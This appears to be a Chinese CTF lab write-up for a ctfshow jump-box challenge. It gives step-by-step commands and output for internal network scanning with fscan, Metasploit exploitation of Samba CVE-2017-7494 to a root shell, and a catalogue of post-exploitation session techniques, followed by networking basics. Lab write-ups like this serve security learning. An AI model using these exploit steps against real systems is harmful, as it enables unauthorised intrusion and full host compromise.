+<p>这条是进入跳板机 shell 之后执行，给二进制加执行权限！</p>
+<blockquote>
+<p><code>chmod</code> 给的是执行权限，而不是<code>root</code></p>
+</blockquote>
+<hr>
+<h1 id="扫内网"><a href="#扫内网" class="headerlink" title="扫内网"></a>扫内网</h1><p>在<code>shell</code>里，不需要<code>root</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/fscan -h 172.2.117.0/24 -nocolor -nopg -o /tmp/fscan_result.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><code>/tmp/fscan</code>：你上传好的 <code>fscan</code> 二进制</li>
+<li><code>-h 172.2.117.0/24</code>：指定扫描网段（主机、端口扫描）</li>
+<li><code>-nocolor</code>：关闭彩色输出，日志不乱码，内网渗透必加</li>
+<li><code>-nopg</code>：关闭进度条，后台跑的时候日志干净</li>
+<li><code>-o /tmp/fscan_result.txt</code>：结果输出到这个文件</li>
+</ul>
+</blockquote>
+<p>23.7s完成：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /tmp/fscan_result.txt</span><br><span class="line"><span class="comment"># ===== 存活主机 =====</span></span><br><span class="line">172.2.117.3</span><br><span class="line">172.2.117.2</span><br><span class="line">172.2.117.5</span><br><span class="line">172.2.117.6</span><br><span class="line">172.2.117.1</span><br><span class="line">172.2.117.4</span><br><span class="line">172.2.117.7</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 开放端口 =====</span></span><br><span class="line">172.2.117.4:22</span><br><span class="line">172.2.117.5:80</span><br><span class="line">172.2.117.6:445</span><br><span class="line">172.2.117.6:139</span><br><span class="line">172.2.117.5:9000</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 服务信息 =====</span></span><br><span class="line">172.2.117.4:22 ssh SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5</span><br><span class="line">http://172.2.117.5:80 [欢迎登陆CTFshow文件管理系统] 200 nginx/1.18.0 [nginx,nginx/1.18.0,php/7.3.22]</span><br><span class="line">172.2.117.6:445 microsoft-ds SMB@ A oa BVQ|@z J `H + &gt;0&lt; 0 + 7 *0( &amp; <span class="variable">$not_defined_in_RFC4178</span>@please_ignore</span><br><span class="line">172.2.117.5:9000 unknown</span><br><span class="line">172.2.117.6:139 microsoft-ds SMB@ A oa s ~@z J `H + &gt;0&lt; 0 + 7 *0( &amp; <span class="variable">$not_defined_in_RFC4178</span>@please_ignore</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== Web服务 =====</span></span><br><span class="line">http://172.2.117.5:80</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="结果整理与问题："><a href="#结果整理与问题：" class="headerlink" title="结果整理与问题："></a>结果整理与问题：</h2><table>
+<thead>
+<tr>
+<th>主机</th>
+<th>端口</th>
+<th>指纹</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>172.2.117.4</td>
+<td>22</td>
+<td>OpenSSH 8.2p1（攻击机自身）</td>
+</tr>
+<tr>
+<td>172.2.117.5</td>
+<td>80 &#x2F; 9000</td>
+<td>nginx 1.18 + PHP 7.3.22，「CTFshow 文件管理系统」</td>
+</tr>
+<tr>
+<td>172.2.117.6</td>
+<td>139 &#x2F; 445</td>
+<td>Samba，认证域 OA；MS17-010 不存在；弱口令无</td>
+</tr>
+<tr>
+<td>.1&#x2F;.2&#x2F;.3&#x2F;.7</td>
+<td>—</td>
+<td>基础设施</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><code>fscan</code> 把 .6 识别成 <code>Windows 7/2008 R2 / SMBv1</code>，这是指纹误判 —— <code>MSF</code> 复核是 <code>Samba 4.6.3</code>。SMB 版本识别不能只信 <code>fscan</code>。</p>
+</blockquote>
+<p>然后<code>fscan</code>扫完 <code>.6</code> 直接没了，等了一分半原来的<code>.6</code>没恢复。于是全段重扫<code>139/445</code>，发现容器被重启，<code>Docker</code> 重新分配了 IP：<code>.6 → .8</code>。</p>
+<p>原因可能就是这条<code>fscan</code>命令攻击性有点强，没有加（<code>-nopoc -nobr，或 -m icmp</code>）这样暴力扫把业务打挂了。</p>
+<blockquote>
+<p>不只是扫端口，还会做服务识别、弱口令爆破和 POC 探测（这次就跑了 487 个 POC、还探了 MS17-010）</p>
+</blockquote>
+<hr>
+<h1 id="MSF利用Samba服务的CVE"><a href="#MSF利用Samba服务的CVE" class="headerlink" title="MSF利用Samba服务的CVE"></a>MSF利用Samba服务的CVE</h1><p>根据扫完内网拿到的结果，<code>.6</code>开放了<code>445</code>端口，果然有<code>Samba</code>服务，用<code>msf</code>中的辅助模块<code>auxiliary/scanner/smb/smb_version</code>检测一下<code>Samba</code>的版本以及是否存在漏洞</p>
+<h2 id="起-msfconsole（要-root）"><a href="#起-msfconsole（要-root）" class="headerlink" title="起 msfconsole（要 root）"></a>起 msfconsole（要 root）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -n /opt/metasploit-framework/bin/msfconsole -q</span><br><span class="line">或者：<span class="built_in">sudo</span> msfconsole -q</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-n</code>：<code>non-interactive</code>，非交互模式，不会弹出密码输入框（这里默认<code>root</code>）</li>
+<li>为何写全路径 <code>/opt/metasploit-framework/bin/msfconsole</code><ul>
+<li>环境变量<code>PATH</code>可能没有加入 <code>msf</code> 的 <code>bin</code> 目录</li>
+<li>这样的话直接敲 <code>msfconsole</code> → <code>command not found</code></li>
+<li>所以必须写完整绝对路径去启动</li>
+</ul>
+</li>
+<li><code>-q</code>：静默启动，跳过 <code>banner</code>，直接进入 <code>msf &gt;</code> 提示符，CTF 渗透里节省时间，日志干净。</li>
+</ul>
+<p>不过这里<code>sudo msfconsole -q</code>也是可以的！</p>
+<blockquote>
+<p>一般<code>command -v msfconsole</code>有输出，就可不写全路径直接启动，这里我们实际探测：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">command</span> -v msfconsole</span><br><span class="line">/usr/bin/msfconsole</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -la /usr/bin/msfconsole</span><br><span class="line">lrwxrwxrwx 1 root root 28 /usr/bin/msfconsole -&gt; /etc/alternatives/msfconsole</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -la /opt/metasploit-framework/bin/msfconsole</span><br><span class="line">-rwxr-xr-x 1 root root 2739 /opt/metasploit-framework/bin/msfconsole</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">sudo</span> -n bash -c <span class="string">&#x27;echo $PATH; command -v msfconsole&#x27;</span></span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</span><br><span class="line">/usr/bin/msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>  三层关系：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/msfconsole            ← Debian alternatives 软链</span><br><span class="line">  → /etc/alternatives/msfconsole</span><br><span class="line">    → /opt/metasploit-framework/bin/msfconsole   ← 真正的启动脚本</span><br></pre></td></tr></table></figure>
+
+<p>  而 <code>sudo</code> 的配置里有：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Defaults secure_path=<span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>  <code>/usr/bin</code> 在 <code>secure_path</code> 里，所以 <code>sudo msfconsole</code> 能找到。</p>
+</blockquote>
+<h2 id="探测版本"><a href="#探测版本" class="headerlink" title="探测版本"></a>探测版本</h2><p>等出现 <code>msf6 &gt;</code> 提示符后，逐条输入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.2.117.8  </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>输出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] 172.2.117.8:445 - SMB Detected (versions:1, 2, 3) ... (authentication domain:OA)</span><br><span class="line">[*] 172.2.117.8:445 - Host could not be identified: Windows 6.1 (Samba 4.6.3)</span><br></pre></td></tr></table></figure>
+
+
+</blockquote>
+<ul>
+<li><code>use</code>：加载 msf 辅助扫描模块 <code>smb_version</code>，作用：<strong>探测 445 端口 SMB 版本、区分是 Windows 还是 Samba</strong></li>
+<li><code>set RHOSTS</code>：RHOSTS &#x3D; Remote Hosts，设置要扫描的目标 IP</li>
+<li><code>run</code>：执行扫描</li>
+<li>预期输出重点：<code>Samba 4.6.3</code>，确认是 Linux 上的 Samba（不是 Windows），这个版本在 CVE-2017-7494 漏洞影响范围内</li>
+</ul>
+<h2 id="确认漏洞（只探测，不执行）"><a href="#确认漏洞（只探测，不执行）" class="headerlink" title="确认漏洞（只探测，不执行）"></a>确认漏洞（只探测，不执行）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/samba/is_known_pipename   </span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.2.117.8 </span><br><span class="line">check   </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>输出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] 172.2.117.8:445 - Samba version 4.6.3 found with writeable share <span class="string">&#x27;myshare&#x27;</span></span><br><span class="line">[*] 172.2.117.8:445 - The target appears to be vulnerable.</span><br></pre></td></tr></table></figure>
+
+
+</blockquote>
+<ul>
+<li><code>use exploit/xxx</code>：加载 CVE-2017-7494 的利用模块</li>
+<li><code>check</code>：<strong>只做漏洞检测，不发起攻击</strong>，安全预判断</li>
+<li>成功回显含义：找到可写共享 <code>myshare</code>，版本满足，判定目标脆弱（vulnerable）</li>
+</ul>
+<blockquote>
+<p>漏洞核心条件：Samba 版本 ≤4.6.4 + 存在<strong>可写共享文件夹</strong></p>
+</blockquote>
+<h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><p>利用原理：上传恶意 so 共享库文件，<code>Samba</code> 服务加载这个 so，执行恶意代码，反弹 <code>shell</code> 回跳板机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> SMB_SHARE_NAME myshare</span><br><span class="line"><span class="built_in">set</span> SMB_FOLDER <span class="string">&quot;&quot;</span></span><br><span class="line">exploit -z</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>exploit -z</code> 表示成功后把会话放到后台，方便继续在控制台操作。</p>
+<p>输出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Uploaded payload to \\172.2.117.8\myshare\xxxx.so</span><br><span class="line">[*] Share <span class="string">&#x27;myshare&#x27;</span> has server-side path <span class="string">&#x27;/home/share&#x27;</span></span><br><span class="line">[*] Loading the payload ... /home/share/xxxx.so</span><br><span class="line">[+] Probe response indicates the interactive payload was loaded...</span><br><span class="line">[*] Command shell session 1 opened (172.2.117.4:xxxxx -&gt; 172.2.117.8:445)</span><br><span class="line">[*] Session 1 created <span class="keyword">in</span> the background.</span><br></pre></td></tr></table></figure>
+
+
+</blockquote>
+<ul>
+<li><code>SMB_SHARE_NAME myshare</code>：指定我们要利用的可写共享名，就是 <code>check</code> 扫出来的 <code>myshare</code></li>
+<li><code>SMB_FOLDER &quot;&quot;</code>：留空，让模块自动去识别共享对应的服务器真实路径（本题会自动识别出 <code>/home/share</code>，不用手动填）</li>
+<li><code>exploit</code>：发起漏洞利用</li>
+<li><code>-z</code>（等价 <code>-j</code>）：拿到 <code>session</code> 之后放到后台，不会自动切进交互式 shell，<code>msf</code> 控制台保持 <code>msf6 &gt;</code> 提示符，方便继续敲命令</li>
+</ul>
+<blockquote>
+<p>回显解读： <code>Uploaded payload ...</code>：恶意 so 已经上传到 <code>myshare</code> 共享<br><code>Share &#39;myshare&#39; has server-side path &#39;/home/share&#39;</code>：模块自动拿到共享在磁盘上真实路径（漏洞最关键信息）<br><code>Command shell session 1 opened</code>：成功建立会话，通道是【跳板机 ←→ 目标 Samba 机器】</p>
+</blockquote>
+<img src="/img/web85901.png">
+
+
+
+<h2 id="读取内容"><a href="#读取内容" class="headerlink" title="读取内容"></a>读取内容</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions -l</span><br><span class="line">sessions -c <span class="string">&quot;id; hostname; ls -la /root; cat /root/flag* 2&gt;/dev/null&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>sessions -l</code>：列出所有已经拿到的后台会话，看会话编号</li>
+<li><code>sessions -c</code>：对指定会话批量执行命令，不用进入交互式 shell</li>
+<li><code>id</code>：查看当前 shell 权限（这里直接是 root）</li>
+<li><code>hostname</code>：看目标主机名（<code>oa</code>）</li>
+<li><code>ls -la /root</code>：列出 root 目录文件，确认 flag 存在</li>
+<li><code>cat /root/flag*</code>：读取 flag</li>
+<li><code>2&gt;/dev/null</code>：把报错信息（没有这个文件之类）丢弃，输出干净，避免干扰</li>
+</ul>
+<img src="/img/web85902.png">
+
+
+
+<p>拿到镜像写死的<code>flag</code>：<code>ctfshow&#123;e7899cb3-53b6-4e01-b8c8-5b4cf7e88368&#125;</code></p>
+<hr>
+<h1 id="MSF其它命令执行方式："><a href="#MSF其它命令执行方式：" class="headerlink" title="MSF其它命令执行方式："></a>MSF其它命令执行方式：</h1><p>除了我们上面的批量执行，因为只有一个。下面列出<code>Claude</code>总结的其他方式，这边推荐交互式。因为我以前也用过，原来总结在这里了</p>
+<p><code>msfconsole</code> 里在会话上执行命令&#x2F;脚本的方式大致分三类：一次性执行、交互式执行、让模块代劳。先看官方 <code>sessions</code> 命令的选项（从源码里扒的）：</p>
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-c &lt;cmd&gt;</code></td>
+<td>在会话上执行系统 <code>shell</code> 命令（我们用的）</td>
+</tr>
+<tr>
+<td><code>-C &lt;cmd&gt;</code></td>
+<td>在会话上执行 <code>Meterpreter</code> 命令（仅 <code>meterpreter</code> 会话）</td>
+</tr>
+<tr>
+<td><code>-i &lt;id&gt;</code></td>
+<td>交互进入会话</td>
+</tr>
+<tr>
+<td><code>-s &lt;script/module&gt;</code></td>
+<td>在会话上跑脚本或 <code>post</code> 模块</td>
+</tr>
+<tr>
+<td><code>-u &lt;id&gt;</code></td>
+<td>把普通 <code>shell</code> 升级成 <code>meterpreter</code></td>
+</tr>
+<tr>
+<td><code>-k / -K</code></td>
+<td>杀指定 &#x2F; 全部会话</td>
+</tr>
+</tbody></table>
+<h2 id="一次性执行（不离开-msf-控制台）"><a href="#一次性执行（不离开-msf-控制台）" class="headerlink" title="一次性执行（不离开 msf 控制台）"></a>一次性执行（不离开 msf 控制台）</h2><p><code>sessions -c</code> —— 执行 shell 命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -c <span class="string">&quot;id; cat /root/flag.txt&quot;</span> -i 1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>有多个会话时必须带 -i，否则会对所有会话执行（很危险）。</li>
+<li>多个命令用；串联。</li>
+<li>输出会回显，适合非交互命令。</li>
+</ul>
+<p><code>sessions -C</code> —— 执行 <code>Meterpreter</code> 命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sessions -C <span class="string">&quot;getuid&quot;</span> -i 1</span><br><span class="line">sessions -C <span class="string">&quot;sysinfo&quot;</span> -i 1</span><br><span class="line">sessions -C <span class="string">&quot;download /root/flag.txt /tmp/flag.txt&quot;</span> -i 1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>只对 <code>meterpreter</code> 会话有效；普通 shell 会话会报错。</li>
+<li>这是「用 <code>meterpreter</code> 的原生命令」而不是「跑系统 shell」。</li>
+</ul>
+<p><code>sessions -s</code> —— 跑脚本或 post 模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions -s checkvm -i 1</span><br><span class="line">sessions -s post/linux/gather/enum_system -i 1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>源码里的示例：<code>sessions -s checkvm -i 1,3-5</code>（支持 1,3-5 这种 ID 列表）。</li>
+<li>适合把「枚举系统 &#x2F; 收集凭据」这类标准动作挂到会话上，不用自己拼命令。</li>
+</ul>
+<p>直接 <code>use post/...</code>（最标准的模块化方式）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/linux/gather/enum_system</span><br><span class="line"><span class="built_in">set</span> SESSION 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>所有 post 模块都认 SESSION 这个选项。</li>
+<li>优点：输出结构化、可复用；缺点：要敲的比 <code>sessions -c</code> 多。</li>
+</ul>
+<h2 id="交互式执行"><a href="#交互式执行" class="headerlink" title="交互式执行"></a>交互式执行</h2><p><code>sessions -i &lt;id&gt;</code> —— 附着到会话</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>
+
+<p>进入后就是你熟悉的 shell 提示符，直接敲命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span></span><br><span class="line">hostname</span><br><span class="line"><span class="built_in">cat</span> /root/flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>返回 <code>msf</code> 控制台：</p>
+<ul>
+<li>普通 shell 会话：Ctrl-Z（后台挂起）</li>
+<li><code>meterpreter</code>：输入 <code>background</code> 或 <code>Ctrl-Z</code></li>
+</ul>
+<blockquote>
+<p>需要 <code>vi</code>、<code>su</code>、python 交互式解释器这类长交互操作时，<code>sessions -c</code> 不合适，必须用 <code>sessions -i</code>。</p>
+</blockquote>
+<h3 id="Meterpreter-内部的执行方式（这个不错）"><a href="#Meterpreter-内部的执行方式（这个不错）" class="headerlink" title="Meterpreter 内部的执行方式（这个不错）"></a><code>Meterpreter</code> 内部的执行方式（这个不错）</h3><p>拿到 <code>meterpreter</code> 后，除了 <code>sessions -C</code>，还有：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">execute -f /bin/sh -a <span class="string">&quot;-c id&quot;</span></span><br><span class="line">execute -H -f /tmp/x -a args</span><br></pre></td></tr></table></figure>
+
+<p><code>execute</code> 常见参数：<code>-f 程序、-a 参数、-i 交互、-H 隐藏、-c 走 channel</code>。</p>
+<p><code>sessions -u</code> —— 升级会话</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -u 1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>把普通 <code>cmd/unix shell</code> 升级成 <code>meterpreter</code>，然后就能用 <code>sessions -C</code>、<code>download/upload</code>、<code>getsystem</code> 等一整套原生命令。</li>
+</ul>
+<blockquote>
+<p>注意：<code>is_known_pipename</code> 这种走 SMB 管道的 shell，升级需要目标能回连 <code>meterpreter</code>（同网段通常可以，因为攻击机 172.2.117.4 与目标同网段）。</p>
+</blockquote>
+<h2 id="批量-自动化"><a href="#批量-自动化" class="headerlink" title="批量 &#x2F; 自动化"></a>批量 &#x2F; 自动化</h2><p>资源脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /tmp/run.rc</span></span><br><span class="line">sessions -c <span class="string">&quot;id&quot;</span> -i 1</span><br><span class="line">sessions -c <span class="string">&quot;cat /root/flag.txt&quot;</span> -i 1</span><br><span class="line">msfconsole -q -r /tmp/run.rc</span><br></pre></td></tr></table></figure>
+
+<p><code>-x</code> 一行流</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q -x <span class="string">&quot;sessions -c &#x27;id&#x27; -i 1; exit -y&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>对全部会话执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -c <span class="string">&quot;id&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>不带 <code>-i</code> 时对所有活动会话执行 —— 批量场景有用，但先 <code>sessions -l</code> 确认会话数量，别误伤。</p>
+<table>
+<thead>
+<tr>
+<th>需求</th>
+<th>推荐</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>跑几条非交互命令、要回显</td>
+<td><code>sessions -c &quot;...&quot; -i N</code></td>
+</tr>
+<tr>
+<td>跑 <code>meterpreter</code> 原生命令</td>
+<td><code>sessions -C &quot;...&quot; -i N</code>（需 <code>meterpreter</code>）</td>
+</tr>
+<tr>
+<td>长时间交互 &#x2F; 需要 shell 提示符</td>
+<td><code>sessions -i N</code></td>
+</tr>
+<tr>
+<td>标准枚举（系统信息、凭据）</td>
+<td><code>sessions -s &lt;module&gt; -i N</code> 或 <code>use post/...</code></td>
+</tr>
+<tr>
+<td>批量、可重复</td>
+<td>资源脚本 <code>/msfconsole -x</code></td>
+</tr>
+<tr>
+<td><code>shell</code> 功能太弱</td>
+<td><code>sessions -u N</code> 升级 <code>meterpreter</code></td>
+</tr>
+</tbody></table>
+<h2 id="本次-Samba-会话的注意事项"><a href="#本次-Samba-会话的注意事项" class="headerlink" title="本次 Samba 会话的注意事项"></a>本次 Samba 会话的注意事项</h2><ul>
+<li>当前会话类型是 <code>cmd/unix/interact</code>（走 SMB 命名管道），<code>sessions -C</code> 不可用，只能用 <code>-c</code> 或 <code>-i</code>。</li>
+<li><code>sessions -c</code> 对交互式程序（如 <code>vi</code>）会卡住，看到输出异常就改用 <code>sessions -i</code>。</li>
+<li>只有一个会话时 <code>-i</code> 可省略，但养成写 <code>-i</code> 的习惯，避免将来多会话时误对全部执行。</li>
+</ul>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>没有总结，写的有点多了，下篇文章再分析其他两个主机上的内容吧。</p>
+<p>有一个是 <code>Web</code> 服务，可以想一想怎么探索、利用？</p>
+<hr>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_47830774/article/details/139773065?ops_request_misc=&request_id=&biz_id=102&utm_term=%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-139773065.142%5Ev102%5Econtrol&spm=1018.2226.3001.4187">渗透测试-内网安全_内网渗透-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35733751/article/details/106893514">1—内网安全——内网渗透基础-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://wanth3f1ag.top/posts/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">ctfshow入门内网渗透 | root@wanth3f1ag</a></p>
+<p><a target="_blank" rel="noopener" href="https://baozongwi.xyz/p/ctfshow-web859-with-jumpbox/">ctfshowweb859_有跳板机 | baozongwi’s blog</a></p>
+<hr>
+<h1 id="PS：前置基础"><a href="#PS：前置基础" class="headerlink" title="PS：前置基础"></a>PS：前置基础</h1><p>都是计网学过的，下面让 AI 总结了一下</p>
+<h2 id="内网网络基础"><a href="#内网网络基础" class="headerlink" title="内网网络基础"></a>内网网络基础</h2><h3 id="内网核心概念"><a href="#内网核心概念" class="headerlink" title="内网核心概念"></a>内网核心概念</h3><ul>
+<li>私网地址段（RFC1918）<ul>
+<li>10.0.0.0&#x2F;8</li>
+<li>172.16.0.0&#x2F;12</li>
+<li>192.168.0.0&#x2F;16</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>公网不能路由，NAT 转发访问外网；内网机器之间二层 &#x2F; 三层互通。</p>
+</blockquote>
+<ul>
+<li><p><strong>网关</strong>：内网出口，一般路由器、防火墙，内网主机默认路由指向网关。</p>
+</li>
+<li><p><strong>子网掩码 &amp; CIDR</strong>：判断是否同一网段；<code>192.168.1.10/24</code> 掩码 255.255.255.0</p>
+</li>
+<li><p>ARP 协议</p>
+<p>：IP→MAC，内网二层核心；ARP 欺骗原理、ARP 缓存表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows</span></span><br><span class="line">arp -a</span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">arp -n</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>DNS</strong>：内网 DNS 服务器，企业有内网域名（xxx.corp）；DNS 缓存、DNS 隧道前置基础</p>
+</li>
+<li><p><strong>DHCP</strong>：自动分配 IP、网关、DNS；DHCP 劫持</p>
+</li>
+<li><p><strong>路由</strong>：直连路由、默认路由；<code>route print</code>(win) &#x2F; <code>ip route</code>(linux)</p>
+</li>
+<li><p><strong>NAT</strong>：源 NAT（内网上网）、目的 NAT（端口映射）；区分 PAT</p>
+</li>
+<li><p><strong>VLAN</strong>：虚拟局域网，隔离广播；不同 VLAN 默认不通，需要三层交换机转发</p>
+</li>
+<li><p><strong>广播域、冲突域</strong>：交换机分割冲突域，路由器分割广播域</p>
+</li>
+</ul>
+<h3 id="内网常用协议（端口-作用）"><a href="#内网常用协议（端口-作用）" class="headerlink" title="内网常用协议（端口 + 作用）"></a>内网常用协议（端口 + 作用）</h3><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>端口</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NetBIOS</td>
+<td>137&#x2F;138(UDP),139(TCP)</td>
+<td>旧 Windows 文件共享、名称解析</td>
+</tr>
+<tr>
+<td>SMB</td>
+<td>445</td>
+<td>Windows 文件共享（永恒之蓝就在这个端口）</td>
+</tr>
+<tr>
+<td>RPC</td>
+<td>135</td>
+<td>Windows 远程过程调用，横向移动高频</td>
+</tr>
+<tr>
+<td>LDAP</td>
+<td>389</td>
+<td>域用户查询、域信息枚举</td>
+</tr>
+<tr>
+<td>LDAPS</td>
+<td>636</td>
+<td>LDAP 加密</td>
+</tr>
+<tr>
+<td>Kerberos</td>
+<td>88</td>
+<td>域认证协议（黄金票据、白银票据核心）</td>
+</tr>
+<tr>
+<td>RDP</td>
+<td>3389</td>
+<td>远程桌面</td>
+</tr>
+<tr>
+<td>SSH</td>
+<td>22</td>
+<td>Linux 远程管理</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>5985(http)&#x2F;5986(https)</td>
+<td>Windows 远程管理，横向移动常用</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>3306</td>
+<td>数据库</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td>1433</td>
+<td>微软数据库</td>
+</tr>
+</tbody></table>
+<h3 id="内网信息收集前置"><a href="#内网信息收集前置" class="headerlink" title="内网信息收集前置"></a>内网信息收集前置</h3><ul>
+<li>ICMP（ping）：探测主机存活；很多防火墙禁 ping，不能只靠 ping</li>
